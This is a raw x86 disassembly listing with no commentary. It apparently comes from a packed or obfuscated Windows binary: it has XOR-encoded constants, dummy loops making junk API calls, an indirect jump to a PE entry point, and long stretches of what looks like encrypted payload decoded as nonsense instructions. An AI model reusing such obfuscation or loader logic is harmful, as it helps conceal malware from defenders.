  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e644
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x4302dd,0x14
  4098db:	cmp    DWORD PTR ds:0x4302dd,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x4302dd,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42eab3
  40991f:	mov    eax,ds:0x4302dd
  409924:	dec    eax
  409925:	mov    ds:0x4302dd,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x430357
  409934:	or     eax,DWORD PTR ds:0x43035f
  40993a:	mov    ds:0x430357,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e650,0x13
  40994c:	cmp    DWORD PTR ds:0x42e650,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e650,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42eab7
  409979:	mov    ecx,DWORD PTR ds:0x42e650
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e650,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x4302c9,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x4302d9,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x43034f,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x43034f
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x43034f,edi
  4099bf:	cmp    DWORD PTR ds:0x43034f,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x4302bd
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42e947
  4099e8:	cmp    DWORD PTR ds:0x43034f,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x43034f
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x43034f,edi
  409a02:	cmp    DWORD PTR ds:0x43034f,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x43035f,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x4302b5,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x4302b5
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x4302b5,ebx
  409a35:	cmp    DWORD PTR ds:0x4302b5,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e883
  409a50:	cmp    DWORD PTR ds:0x4302b5,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x4302b5
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x4302b5,ebx
  409a6a:	cmp    DWORD PTR ds:0x4302b5,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e648
  409a7d:	or     DWORD PTR ds:0x42ec4b,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	pop    ebp
  409a95:	jnp    0x409acd
  409a97:	jmp    0x7ebf76f5
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a7f
  409aa1:	aaa    
  409aa2:	mov    ds:0x89d63427,al
  409aa7:	xchg   edi,eax
  409aa8:	shr    DWORD PTR [ecx-0x266b9575],0xf1
  409aaf:	sbb    eax,0xaffc6870
  409ab4:	jo     0x409a7b
  409ab6:	mov    al,0x9b
  409ab8:	jae    0x409a7e
  409aba:	rcr    DWORD PTR [esi-0x2bfa518f],0x45
  409ac1:	sahf   
  409ac2:	dec    edx
  409ac3:	cli    
  409ac4:	or     DWORD PTR [edx+edi*8-0x41],ebx
  409ac8:	add    al,BYTE PTR [esi+edx*4+0x50]
  409acc:	mov    ch,0x2
  409ace:	call   0xe76a8d08
  409ad3:	test   BYTE PTR [eax],ch
  409ad5:	retf   0x139c
  409ad8:	xor    ch,BYTE PTR [esi]
  409ada:	ret    
  409adb:	jo     0x409a9f
  409add:	fisttp QWORD PTR [ebx]
  409adf:	add    esp,DWORD PTR [ebx+0x9]
  409ae2:	popf   
  409ae3:	lods   al,BYTE PTR ds:[esi]
  409ae4:	scas   eax,DWORD PTR es:[edi]
  409ae5:	lods   al,BYTE PTR ds:[esi]
  409ae6:	lods   eax,DWORD PTR ds:[esi]
  409ae7:	inc    edi
  409ae8:	xchg   edi,eax
  409ae9:	cli    
  409aea:	lods   al,BYTE PTR ds:[esi]
  409aeb:	xchg   edx,eax
  409aec:	jp     0x409b0e
  409aee:	call   0x18af:0x4c86f4d8
  409af5:	inc    esp
  409af6:	pop    edx
  409af7:	sub    ch,al
  409af9:	xchg   esi,eax
  409afa:	jae    0x409b14
  409afc:	adc    eax,DWORD PTR [edi]
  409afe:	retf   0xe68a
  409b01:	mov    WORD PTR [edx-0xd21fd56],cs
  409b07:	push   0xffffff91
  409b09:	mov    cl,0x12
  409b0b:	pop    esi
  409b0c:	xchg   esp,eax
  409b0d:	mov    esp,0x60ca6912
  409b12:	ret    
  409b13:	xor    eax,0xff2e82b5
  409b18:	sar    BYTE PTR [edx+0xf],1
  409b1b:	bound  ecx,QWORD PTR [esi]
  409b1d:	add    ch,BYTE PTR [edi+ecx*1]
  409b20:	rcl    edx,0x49
  409b23:	stos   BYTE PTR es:[edi],al
  409b24:	add    eax,ebx
  409b26:	fisubr DWORD PTR [ebp+0x23]
  409b29:	cmp    BYTE PTR [esi],dh
  409b2b:	mov    BYTE PTR [edi+0x7afb54c8],ah
  409b31:	inc    esi
  409b32:	cmp    eax,DWORD PTR [ebp+0x35]
  409b35:	loopne 0x409afe
  409b37:	pop    es
  409b38:	pushw  0xff97
  409b3b:	push   edi
  409b3c:	and    al,0x2f
  409b3e:	(bad)  
  409b3f:	call   0x543f899a
  409b44:	pop    ecx
  409b45:	push   es
  409b46:	jmp    0x5bca:0x1b08d62c
  409b4d:	cmp    al,0xad
  409b4f:	enter  0xe993,0x69
  409b53:	shr    ch,1
  409b55:	sub    eax,0xe072d862
  409b5a:	lods   eax,DWORD PTR ds:[esi]
  409b5b:	div    DWORD PTR [ebx-0x18cc69da]
  409b61:	retf   0x459a
  409b64:	adc    DWORD PTR [eax],edi
  409b66:	sbb    al,0x19
  409b68:	adc    al,0xc2
  409b6a:	std    
  409b6b:	jnp    0x409bec
  409b6d:	cmc    
  409b6e:	dec    ebp
  409b6f:	mov    esp,0x4d93c093
  409b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b75:	imul   eax,DWORD PTR ds:0x915f109f,0x1f
  409b7c:	jns    0x409b34
  409b7e:	adc    dh,BYTE PTR [eax-0x6c]
  409b81:	cmp    DWORD PTR [edx-0x669655a8],eax
  409b87:	mov    ds:0x68491396,eax
  409b8c:	push   ecx
  409b8d:	imul   esi,DWORD PTR [edx-0x37],0xb70fb548
  409b94:	mov    esi,0x7bb9a84e
  409b99:	mov    ds:0x19977e07,al
  409b9e:	loopne 0x409c01
  409ba0:	pop    ebp
  409ba1:	fistp  WORD PTR [ebx+0x76]
  409ba4:	(bad)  
  409ba5:	xor    dl,BYTE PTR ds:0x3bcf59a2
  409bab:	aam    0x28
  409bad:	(bad)  
  409bae:	mov    al,0xaf
  409bb0:	add    bl,bl
  409bb2:	sub    BYTE PTR [ecx+0x4743cd52],bl
  409bb8:	adc    ch,BYTE PTR [edi-0x50]
  409bbb:	cs loope 0x409c1f
  409bbe:	ja     0x409b96
  409bc0:	outs   dx,DWORD PTR ds:[esi]
  409bc1:	inc    esp
  409bc2:	or     edi,DWORD PTR [eax]
  409bc4:	mov    dh,0x2b
  409bc6:	das    
  409bc7:	cmp    DWORD PTR [eax],edi
  409bc9:	dec    ecx
  409bca:	and    eax,0x74a95c7e
  409bcf:	ss dec eax
  409bd1:	lea    ecx,[ebp+ebx*4-0x5]
  409bd5:	xlat   BYTE PTR ds:[ebx]
  409bd6:	sbb    DWORD PTR [esp+ecx*4+0x6],ecx
  409bda:	lock mov edi,DWORD PTR [ebx+eax*8+0x2e]
  409bdf:	mov    esp,0x34ead344
  409be4:	inc    ebp
  409be5:	ins    BYTE PTR es:[edi],dx
  409be6:	jp     0x409c45
  409be8:	stos   BYTE PTR es:[edi],al
  409be9:	mov    ds:0xb4e18ce5,al
  409bee:	pop    ecx
  409bef:	add    ebx,DWORD PTR [esi-0x5e]
  409bf2:	out    dx,eax
  409bf3:	(bad)  
  409bf4:	push   es
  409bf5:	int3   
  409bf6:	dec    eax
  409bf7:	lds    eax,FWORD PTR [esi-0x3f3c8d52]
  409bfd:	push   0x315deae3
  409c02:	test   ah,dl
  409c04:	and    ecx,DWORD PTR [edi-0x72]
  409c07:	cdq    
  409c08:	repnz outs dx,BYTE PTR ds:[esi]
  409c0a:	in     al,0xd4
  409c0c:	push   ebp
  409c0d:	mov    WORD PTR [eax-0x5414132],gs
  409c13:	bound  ebx,QWORD PTR [edi]
  409c15:	retf   
  409c16:	xchg   BYTE PTR [ecx-0x60],ch
  409c19:	pop    esp
  409c1a:	xor    ebx,DWORD PTR [ebx]
  409c1c:	imul   edi,DWORD PTR [ebx+0x36],0xffffffa5
  409c20:	sahf   
  409c21:	fbstp  TBYTE PTR [edx]
  409c23:	fisttp QWORD PTR [ebx+ecx*2-0x5cfb65ac]
  409c2a:	adc    DWORD PTR [edi+ebx*1],ebx
  409c2d:	mov    dl,0x9f
  409c2f:	std    
  409c30:	xor    BYTE PTR [edi-0x1bf3a885],dl
  409c36:	and    ecx,DWORD PTR [edi+0x78420218]
  409c3c:	imul   esp,DWORD PTR [edx+0xd831bf1],0x8158a396
  409c46:	jo     0x409c24
  409c48:	enter  0x18c4,0xc
  409c4c:	loop   0x409cc0
  409c4e:	mov    ebx,0xf9ec2804
  409c53:	test   eax,eax
  409c55:	dec    esi
  409c56:	pop    eax
  409c57:	sub    eax,0xfba2fc04
  409c5c:	int    0x16
  409c5e:	enter  0xe7,0xc8
  409c62:	leave  
  409c63:	jne    0x409ca5
  409c65:	lds    ebx,FWORD PTR [ebx]
  409c67:	sahf   
  409c68:	add    al,0xcb
  409c6a:	repz xchg ebx,eax
  409c6c:	adc    ebx,ebp
  409c6e:	sbb    BYTE PTR [ebx+ecx*1-0x62f2dbb8],dl
  409c75:	push   ss
  409c76:	and    esi,DWORD PTR [ebx]
  409c78:	hlt    
  409c79:	pop    edx
  409c7a:	sub    esp,DWORD PTR [esi+0x0]
  409c7d:	mov    ds:0x3bc864a3,eax
  409c82:	add    DWORD PTR [esi-0x2c13c9c7],eax
  409c88:	rol    DWORD PTR [edx+eax*1-0x1b12156a],0x96
  409c90:	pushw  0x2950
  409c94:	pop    edi
  409c95:	pusha  
  409c96:	fsub   DWORD PTR [eax+0x55ba9e6a]
  409c9c:	stc    
  409c9d:	adc    DWORD PTR [edx],ebx
  409c9f:	mov    al,0x52
  409ca1:	test   al,0x6c
  409ca3:	inc    ebx
  409ca4:	mov    al,0x3d
  409ca6:	pop    edi
  409ca7:	add    BYTE PTR [eax-0x57],ch
  409caa:	fsubp  st(5),st
  409cac:	and    esp,edx
  409cae:	mov    es,WORD PTR [edi+0x47]
  409cb1:	into   
  409cb2:	ins    BYTE PTR es:[edi],dx
  409cb3:	mov    al,dh
  409cb5:	inc    edx
  409cb6:	xchg   ebx,eax
  409cb7:	outs   dx,DWORD PTR ds:[esi]
  409cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cb9:	sub    ebp,DWORD PTR ds:[edx]
  409cbc:	pop    ebp
  409cbd:	(bad)  
  409cbe:	and    al,0xff
  409cc0:	in     al,dx
  409cc1:	retf   0xc472
  409cc4:	and    ebp,DWORD PTR [eax+0x3f6457b2]
  409cca:	or     bh,BYTE PTR [ecx]
  409ccc:	or     BYTE PTR [edx],cl
  409cce:	mov    gs,WORD PTR [ebx-0x15]
  409cd1:	or     cl,BYTE PTR [ecx]
  409cd3:	jp     0x409d1a
  409cd5:	sub    eax,0x55d65b99
  409cda:	ins    BYTE PTR es:[edi],dx
  409cdb:	mov    ss,WORD PTR [ebp+0x21]
  409cde:	sub    ebp,DWORD PTR [ecx+0x1d]
  409ce1:	push   cs
  409ce2:	idiv   al
  409ce4:	pop    ebx
  409ce5:	push   ebx
  409ce6:	bound  edx,QWORD PTR [esi+0x62bdd7d4]
  409cec:	jg     0x409c85
  409cee:	leave  
  409cef:	xchg   edi,eax
  409cf0:	cmp    bh,cl
  409cf2:	call   0x7d2348cb
  409cf7:	sbb    al,0x5a
  409cf9:	inc    eax
  409cfa:	gs xor al,0xd4
  409cfd:	sbb    DWORD PTR [ebp+0x502353d1],ebp
  409d03:	arpl   dx,si
  409d05:	(bad)  
  409d06:	xchg   ecx,eax
  409d07:	dec    ecx
  409d08:	jmp    FWORD PTR [ecx]
  409d0a:	call   0x55a8:0x818efe3c
  409d11:	add    BYTE PTR [ebp-0x748203d2],cl
  409d17:	mov    edi,0x5a15a68e
  409d1c:	add    esp,DWORD PTR [ebx+ecx*1]
  409d1f:	mov    cl,0x1d
  409d21:	add    al,0x5f
  409d23:	test   BYTE PTR [edx-0x11],bh
  409d26:	mov    WORD PTR [esi+0xbbbd5ac],cs
  409d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d2d:	fstp   TBYTE PTR [eax-0x75]
  409d30:	cmp    al,0x2e
  409d32:	enter  0xe924,0x7e
  409d36:	pop    es
  409d37:	ds call 0x2c8b:0xfffbadb3
  409d3f:	(bad)  
  409d40:	mov    eax,ebp
  409d42:	jns    0x409daa
  409d44:	rcl    BYTE PTR [ecx+0x71],1
  409d47:	les    ebp,FWORD PTR [edx]
  409d49:	scas   al,BYTE PTR es:[edi]
  409d4a:	ss pop ebp
  409d4c:	fisub  WORD PTR [ecx+esi*2+0x240986c1]
  409d53:	xor    ebx,DWORD PTR [ebp-0x48]
  409d56:	cmp    DWORD PTR [ebx-0x33],ebx
  409d59:	loope  0x409d8b
  409d5b:	sub    ah,bh
  409d5d:	fmul   st,st(5)
  409d5f:	jb     0x409cf7
  409d61:	call   0xd2bfe2f9
  409d66:	sar    BYTE PTR [ecx-0x2d],0x1a
  409d6a:	jmp    0x41d3:0x92c65aa8
  409d71:	pop    ecx
  409d72:	ss pop ebp
  409d74:	test   eax,0xe9181cfa
  409d79:	shl    esi,1
  409d7b:	sbb    eax,0xc452109
  409d80:	xor    eax,eax
  409d82:	cwde   
  409d83:	aas    
  409d84:	scas   al,BYTE PTR es:[edi]
  409d85:	mov    dh,0xe6
  409d87:	(bad)  
  409d88:	jp     0x409df8
  409d8a:	sbb    BYTE PTR [edx-0x64],dl
  409d8d:	inc    ecx
  409d8e:	and    al,0x5c
  409d90:	in     al,0x6d
  409d92:	in     al,dx
  409d93:	ret    0x8561
  409d96:	ins    BYTE PTR es:[edi],dx
  409d97:	popa   
  409d98:	dec    edi
  409d99:	stos   BYTE PTR es:[edi],al
  409d9a:	mov    esi,0x83dc2ec
  409d9f:	ds jae 0x409db2
  409da2:	push   edx
  409da3:	ret    0xb6b3
  409da6:	push   cs
  409da7:	push   es
  409da8:	pop    es
  409da9:	(bad)  
  409daa:	mov    ds:0x5b1b828e,al
  409daf:	retf   0x4db
  409db2:	mov    ecx,DWORD PTR [esi-0x584e7fda]
  409db8:	mov    ah,0xf7
  409dba:	in     eax,0x89
  409dbc:	or     esp,DWORD PTR ds:0x619f2a1e
  409dc2:	mov    ecx,0x7ddd6376
  409dc7:	or     DWORD PTR [esi],eax
  409dc9:	out    0xdf,al
  409dcb:	cmp    BYTE PTR [edi-0x6e],bl
  409dce:	fldcw  WORD PTR [ebx+eax*1+0x581d8bc7]
  409dd5:	out    0x42,al
  409dd7:	add    BYTE PTR [ebx],al
  409dd9:	sbb    eax,0x430357
  409dde:	mov    DWORD PTR ds:0x42e658,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x4302dd,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x43034f,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x4302d1
  409e03:	and    DWORD PTR ds:0x4302f1,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x4302cd,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e20
  409e2b:	sbb    al,0x1e
  409e2d:	pop    ecx
  409e2e:	or     eax,ebx
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409ddd
  409e37:	int    0x39
  409e39:	push   ecx
  409e3a:	lock icebp 
  409e3c:	mov    cl,0x57
  409e3e:	lea    esp,[ecx+ecx*2+0xd]
  409e42:	xor    esp,DWORD PTR [esi-0x4c]
  409e45:	cmp    eax,0x1f9e0419
  409e4a:	stos   BYTE PTR es:[edi],al
  409e4b:	rcl    BYTE PTR [edi+0x2c2810e],1
  409e51:	adc    DWORD PTR [edi+edi*2],ebx
  409e54:	inc    eax
  409e55:	dec    DWORD PTR [ecx-0x641bee45]
  409e5b:	inc    eax
  409e5c:	out    dx,al
  409e5d:	popa   
  409e5e:	xor    ebx,esi
  409e60:	into   
  409e61:	ss in  eax,dx
  409e63:	loop   0x409ed3
  409e65:	ret    0x6bbe
  409e68:	pop    edx
  409e69:	fisubr WORD PTR [eax]
  409e6b:	sub    eax,0x5c51db7e
  409e70:	mov    BYTE PTR [edi],bl
  409e72:	fistp  DWORD PTR [esi+0x64]
  409e75:	dec    esi
  409e76:	mov    dh,0x90
  409e78:	mov    ah,0x17
  409e7a:	push   0xffffffd4
  409e7c:	jno    0x409e70
  409e7e:	jmp    0x409e04
  409e80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e81:	les    ecx,FWORD PTR [bx]
  409e84:	pop    edx
  409e85:	test   DWORD PTR [edi-0x50],0x97dea085
  409e8c:	dec    ebp
  409e8d:	dec    ecx
  409e8e:	jge    0x409e90
  409e90:	dec    ebx
  409e91:	inc    edx
  409e92:	or     BYTE PTR [ecx-0x57e622a2],al
  409e98:	cmp    eax,0xcbfc274
  409e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e9e:	pop    ebx
  409e9f:	xchg   edx,eax
  409ea0:	scas   eax,DWORD PTR es:[edi]
  409ea1:	cmp    edx,eax
  409ea3:	push   ebp
  409ea4:	aaa    
  409ea5:	mov    bh,0xaf
  409ea7:	stos   DWORD PTR es:[edi],eax
  409ea8:	sub    bl,BYTE PTR [edx]
  409eaa:	xor    DWORD PTR [ecx],0x3b
  409ead:	aad    0x9e
  409eaf:	cmc    
  409eb0:	xchg   edx,eax
  409eb1:	imul   ebx,DWORD PTR [ebx-0x6fff2bbb],0xebc8946e
  409ebb:	or     eax,0xeee8be65
  409ec0:	je     0x409e49
  409ec2:	sub    ch,BYTE PTR [edi+0x5]
  409ec5:	les    esp,FWORD PTR [eax+0x34ab093f]
  409ecb:	loop   0x409f23
  409ecd:	imul   ebx,DWORD PTR [ebx],0xaea7b991
  409ed3:	retf   
  409ed4:	mov    ebp,0x104c3f8a
  409ed9:	ds pop esp
  409edb:	mov    esp,0x6a74e79
  409ee0:	arpl   WORD PTR [ebp-0x79],bp
  409ee3:	mov    bh,0xf7
  409ee5:	mov    al,0xde
  409ee7:	mov    BYTE PTR [esi+0xc],bl
  409eea:	imul   ebx,ecx,0xe4724989
  409ef0:	adc    DWORD PTR [edx],ebx
  409ef2:	jle    0x409ef8
  409ef4:	jmp    0x409ed5
  409ef6:	cld    
  409ef7:	js     0x409ee4
  409ef9:	lock xchg esp,eax
  409efb:	sub    DWORD PTR [ecx+0x17ed4e0a],edi
  409f01:	sbb    BYTE PTR [edx],cl
  409f03:	sbb    eax,esp
  409f05:	xor    eax,0xfac7df6f
  409f0a:	das    
  409f0b:	add    esp,ecx
  409f0d:	add    ecx,ebx
  409f0f:	cwde   
  409f10:	mov    edx,0x3e208154
  409f15:	in     eax,dx
  409f16:	lds    edx,FWORD PTR [esp+ebx*2-0x23]
  409f1a:	jmp    0xbb016d93
  409f1f:	jo     0x409f63
  409f21:	test   al,dh
  409f23:	dec    eax
  409f24:	sub    eax,0x11d72129
  409f29:	and    DWORD PTR cs:[esp+eiz*2-0x1118d87a],eax
  409f31:	int    0xf3
  409f33:	mov    edi,0x8b988ed0
  409f38:	icebp  
  409f39:	dec    edx
  409f3a:	add    al,0x10
  409f3c:	mov    ebx,DWORD PTR ds:0xd825eaeb
  409f42:	mov    DWORD PTR [eax],esp
  409f44:	or     DWORD PTR [ecx-0x5000f6d6],ebx
  409f4a:	mov    edi,0x42a8688c
  409f4f:	cmc    
  409f50:	add    ch,BYTE PTR [eax]
  409f52:	pop    ss
  409f53:	adc    eax,0xfad79301
  409f58:	dec    edi
